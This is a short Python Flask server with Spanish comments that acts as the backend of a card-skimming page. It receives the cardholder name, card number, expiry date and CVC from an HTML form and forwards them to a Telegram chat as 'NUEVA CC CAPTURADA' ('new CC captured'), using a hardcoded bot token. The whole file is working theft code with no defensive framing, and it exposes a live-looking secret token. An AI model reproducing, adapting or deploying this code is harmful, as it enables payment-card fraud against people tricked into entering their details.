import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
# Permite que tu HTML le hable al servidor
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    # El HTML le manda el ID directamente
    target_id = str(data.get('target_id'))

    # Captura de datos
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    # Envía la CC al ID que mandó el HTML
    url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": target_id, "text": mensaje, "parse_mode": "Markdown"}
    
    try:
        res = requests.post(url_telegram, json=payload, timeout=5)
        if res.status_code == 200:
            print(f"✅ Enviado al ID: {target_id}")
            return jsonify({"status": "success"}), 200
        else:
            print(f"❌ Error Telegram: {res.text}")
            return jsonify({"status": "error"}), 500
    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
